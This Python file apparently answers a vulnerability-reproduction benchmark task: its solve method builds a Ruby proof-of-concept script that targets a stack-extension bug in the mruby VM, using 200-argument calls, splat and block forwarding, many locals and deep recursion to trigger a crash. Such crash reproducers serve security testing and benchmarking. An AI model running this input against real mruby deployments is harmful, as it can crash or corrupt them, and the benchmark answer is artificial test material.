import os


class Solution:
    def solve(self, src_path: str) -> bytes:
        N_ARGS = 200
        N_RECURSION = 40

        # Build argument and parameter lists
        param_names = [f"a{i}" for i in range(N_ARGS)]
        params_plain = ",".join(param_names)
        numbers_list = ",".join("1" for _ in range(N_ARGS))

        script_parts = []

        # Header/comment
        script_parts.append("# Auto-generated PoC script targeting mruby VM stack extension bug\n\n")

        # big_plain: many explicit positional arguments
        script_parts.append("def big_plain(")
        script_parts.append(params_plain)
        script_parts.append(")\n")
        script_parts.append("  nil\n")
        script_parts.append("end\n\n")

        # big_rest: variadic method
        script_parts.append("def big_rest(*args)\n")
        script_parts.append("  nil\n")
        script_parts.append("end\n\n")

        # big_block: forwards to block or to big_rest
        script_parts.append("def big_block(*args, &blk)\n")
        script_parts.append("  if blk\n")
        script_parts.append("    blk.call(*args)\n")
        script_parts.append("  else\n")
        script_parts.append("    big_rest(*args)\n")
        script_parts.append("  end\n")
        script_parts.append("end\n\n")

        # yield_many: uses yield with many arguments
        script_parts.append("def yield_many(*args)\n")
        script_parts.append("  if block_given?\n")
        script_parts.append("    yield(*args)\n")
        script_parts.append("  end\n")
        script_parts.append("end\n\n")

        # many_locals: creates many local variables and recurses
        script_parts.append("def many_locals(n)\n")
        for i in range(N_ARGS):
            script_parts.append(f"  v{i} = {i}\n")
        script_parts.append("  if n > 0\n")
        script_parts.append("    many_locals(n-1)\n")
        script_parts.append("  else\n")
        script_parts.append("    big_plain(")
        script_parts.append(numbers_list)
        script_parts.append(")\n")
        script_parts.append("    big_rest(")
        script_parts.append(numbers_list)
        script_parts.append(")\n")
        script_parts.append("    big_block(")
        script_parts.append(numbers_list)
        script_parts.append(") { |*z| big_rest(*z) }\n")
        script_parts.append("    yield_many(")
        script_parts.append(numbers_list)
        script_parts.append(") { |*y| big_plain(*y) }\n")
        script_parts.append("  end\n")
        script_parts.append("end\n\n")

        # deep_rec: recursion depth with heavy calls at the bottom
        script_parts.append("def deep_rec(n)\n")
        script_parts.append("  if n > 0\n")
        script_parts.append("    deep_rec(n-1)\n")
        script_parts.append("  else\n")
        script_parts.append("    3.times do\n")
        script_parts.append("      big_plain(")
        script_parts.append(numbers_list)
        script_parts.append(")\n")
        script_parts.append("      big_rest(")
        script_parts.append(numbers_list)
        script_parts.append(")\n")
        script_parts.append("      big_block(")
        script_parts.append(numbers_list)
        script_parts.append(") { |*x| big_rest(*x) }\n")
        script_parts.append("      yield_many(")
        script_parts.append(numbers_list)
        script_parts.append(") { |*y| big_plain(*y) }\n")
        script_parts.append("    end\n")
        script_parts.append("  end\n")
        script_parts.append("end\n\n")

        # Top-level direct calls to stress the stack without recursion
        script_parts.append("3.times do\n")
        script_parts.append("  big_plain(")
        script_parts.append(numbers_list)
        script_parts.append(")\n")
        script_parts.append("  big_rest(")
        script_parts.append(numbers_list)
        script_parts.append(")\n")
        script_parts.append("  big_block(")
        script_parts.append(numbers_list)
        script_parts.append(") { |*x| big_rest(*x) }\n")
        script_parts.append("  yield_many(")
        script_parts.append(numbers_list)
        script_parts.append(") { |*y| big_plain(*y) }\n")
        script_parts.append("end\n\n")

        # Invoke many_locals with recursion
        script_parts.append(f"many_locals({N_RECURSION})\n\n")

        # Invoke deep_rec with recursion
        script_parts.append(f"deep_rec({N_RECURSION})\n\n")

        # Nested loops and blocks with many-argument calls
        script_parts.append("3.times do |i|\n")
        script_parts.append("  3.times do |j|\n")
        script_parts.append("    big_block(")
        script_parts.append(numbers_list)
        script_parts.append(") do |*b|\n")
        script_parts.append("      big_plain(")
        script_parts.append(numbers_list)
        script_parts.append(")\n")
        script_parts.append("      big_rest(*b)\n")
        script_parts.append("      yield_many(")
        script_parts.append(numbers_list)
        script_parts.append(") { |*y| big_plain(*y) }\n")
        script_parts.append("    end\n")
        script_parts.append("  end\n")
        script_parts.append("end\n")

        full_script = "".join(script_parts)
        return full_script.encode("utf-8")